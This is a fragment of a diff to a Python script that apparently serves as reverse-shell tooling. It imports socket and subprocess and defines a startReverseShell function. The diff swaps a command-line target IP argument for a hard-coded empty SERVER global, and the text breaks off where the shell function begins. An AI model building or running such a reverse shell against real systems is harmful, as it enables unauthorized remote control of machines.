@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
+global SERVER; SERVER = ''
 import socket
 import struct
-import sys
 import time
 import os
 import base64
@@ -9,12 +9,6 @@ import subprocess
 import threading
 
 WAIT_TIME = 10
-
-if (len(sys.argv) != 2):
-    print("Usage: server.py {ip to send to}")
-    exit
-else:
-    SERVER = sys.argv[1]
 
 def startReverseShell(HOST, PORT):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
